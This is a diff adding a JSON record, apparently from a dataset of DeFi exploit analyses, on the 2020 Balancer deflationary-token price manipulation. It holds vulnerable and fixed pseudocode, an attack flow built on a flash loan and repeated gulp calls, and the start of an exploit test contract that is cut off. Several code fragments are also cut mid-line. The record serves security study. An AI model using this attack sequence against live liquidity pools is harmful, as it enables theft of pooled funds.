@@ -1,0 +1,36 @@
+{
+ "id": "2020__2020-06-28_Balancer_DeflatTokenManipulation",
+ "source_file": "2020/2020-06-28_Balancer_DeflatTokenManipulation.md",
+ "title": "Balancer — Deflationary Token Price Manipulation Analysis",
+ "date": "2020-06-28",
+ "protocol": "Balancer Protocol",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$500,000 (WETH + WBTC + LINK + SNX mix across two pools)",
+ "loss_usd": 500000.0,
+ "root_cause": "Pool balance discrepancy due to incompatibility with deflationary token (STA) that charges a transfer fee",
+ "attack_tx": "0x013be977...",
+ "vulnerable_contract": "0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Balancer swapExactAmountIn pseudocode (vulnerable)\nfunction swapExactAmountIn(\n    address tokenIn,\n    uint256 tokenAmountIn,   //",
+  "❌ Trusts input value rather than actual amount received\n    address tokenOut,\n    uint256 minAmountOut,\n    uint256 maxPrice\n) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter) {\n\n    //",
+  "❌ tokenAmountIn may differ from the actual amount transferred (deflationary token)\n    // STA burns 1% on transfer → actual received = tokenAmountIn * 0.99\n    uint256 inRecord_balance = _records[tokenIn].balance;\n\n    //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction swapExactAmountIn(...) external {\n    uint256 balanceBefore = IERC20(tokenIn).balanceOf(address(this));\n    IERC20(tokenIn).transferFrom(msg.sender, address(this), tokenAmountIn);\n    uint256 actualReceived = IERC20(tokenIn).balanceOf(address(this)) - balanceBefore;\n\n    //",
+  "✅ Update balance with the actual amount received\n    _records[tokenIn].balance = inRecord_balance + actualReceived;\n}\n\n// gulp(): Force-syncs internal records to the actual balance (exploited by attacker)\nfunction gulp(address token) external {\n    //"
+ ],
+ "steps": [
+  "[2] Swap large amount WETH → STA (swapExactAmountIn)",
+  "[3] Swap large amount STA → WETH",
+  "1% burned on STA transfer → pool's actual STA < recorded STA",
+  "→ STA price = effectively infinite",
+  "→ Withdraw nearly all WETH"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] dYdX Flash Loan: Borrow large amount of WETH\n    │\n    ├─[2] Swap large amount WETH → STA (swapExactAmountIn)\n    │       Pool: STA decreases, WETH increases\n    │\n    ├─[3] Swap large amount STA → WETH\n    │       1% burned on STA transfer → pool's actual STA < recorded STA\n    │\n    ├─[4] Repeat steps [2]~[3] dozens of times\n    │       Goal: pool's actual STA balance = 1 (minimum value)\n    │\n    ├─[5] Call gulp(STA)\n    │       Sync internal record to actual balance (1)\n    │       → STA price = effectively infinite\n    │\n    ├─[6] Exchange 1 STA for large amount of WETH\n    │       swapExactAmountOut(WETH, MAX, STA, pool_STA-1, MAX)\n    │       → Withdraw nearly all WETH\n    │\n    ├─[7] Repeatedly call gulp(STA) and swap 1 STA for WETH 20 times\n    │\n    └─[8]",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface BPool {\n    function swapExactAmountIn(\n        address tokenIn, uint256 tokenAmountIn,\n        address tokenOut, uint256 minAmountOut, uint256 maxPrice\n    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);\n\n    function gulp(address token) external;       // Sync records to actual balance\n    function getBalance(address token) external view returns (uint256);\n\n    function swapExactAmountOut(\n        address tokenIn, uint256 maxAmountIn,\n        address tokenOut, uint256 tokenAmountOut, uint256 maxPrice\n    ) external;\n}\n\ncontract BalancerExp is Test {\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address sta  = 0xa7DE087329BFcda5639247F96140f9DAb"
+ ]
+}
